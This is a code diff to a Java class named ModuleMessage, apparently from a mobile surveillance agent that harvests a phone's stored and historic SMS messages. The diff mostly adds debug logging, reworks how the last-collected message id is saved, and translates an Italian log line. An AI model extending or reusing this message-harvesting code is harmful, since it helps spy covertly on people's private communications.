@@ -86,11 +86,18 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		if (configMarkup.isMarkup()) {
 			try {
 				oldConfig = (String[]) configMarkup.readMarkupSerializable();
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (parse): config size: " + oldConfig.length);
+				}
 			} catch (Exception e) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (parse) Error: " + e);
 				}
 				oldConfig = new String[] { "", "", "" };
+			}
+		}else{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (parse): no oldConfig available");
 			}
 		}
 
@@ -107,13 +114,22 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 			if (!config[ID_SMS].equals(oldConfig[ID_SMS])) {
 				// configSmsChanged = true;
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (parse): remove SMS markup");
+				}
 				storedSMS.removeMarkup();
 			}
 
 			if (!config[ID_MMS].equals(oldConfig[ID_MMS])) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (parse): remove MMS markup");
+				}
 				storedMMS.removeMarkup();
 			}
 
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (parse): updating configMarkup");
+			}
 			configMarkup.writeMarkupSerializable(config);
 
 		} catch (ConfigurationException e) {
@@ -196,18 +212,22 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		if (storedSMS.isMarkup()) {
 			try {
 				lastSMS = (Integer) storedSMS.readMarkupSerializable();
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (initSms): lastSMS: " + lastSMS);
+				}
 			} catch (Exception e) {
 				storedSMS.removeMarkup();
-				lastSMS = readHistoricSms(lastSMS);
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (actualStart) Error reading markup: " + e);
 				}
 			}
 		}
 
-		lastSMS = readHistoricSms(lastSMS);
-
-		updateMarkupSMS(lastSMS);
+		int mylastSMS = readHistoricSms(lastSMS);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (initSms): next lastSMS: " + mylastSMS);
+		}
+		updateMarkupSMS(mylastSMS);
 
 		/*
 		 * if (!storedSMS.isMarkup()) { int lastSMS = readHistoricSms();
@@ -246,6 +266,9 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	public synchronized void updateMarkupSMS(int value) {
 		try {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (updateMarkupSMS): " + value);
+			}
 			lastSMS = value;
 			storedSMS.writeMarkupSerializable(new Integer(value));
 		} catch (IOException e) {
@@ -283,7 +306,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	private int readHistoricSms(int lastSMS) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (begin): cattura sms di storico");//$NON-NLS-1$
+			Check.log(TAG + " (begin): historic sms harvesting");//$NON-NLS-1$
 		}
 
 		final SmsBrowser smsBrowser = new SmsBrowser();
@@ -385,6 +408,9 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	}
 
 	public synchronized int getLastManagedSmsId() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (getLastManagedSmsId): " + lastSMS);
+		}
 		return lastSMS;
 	}
 }
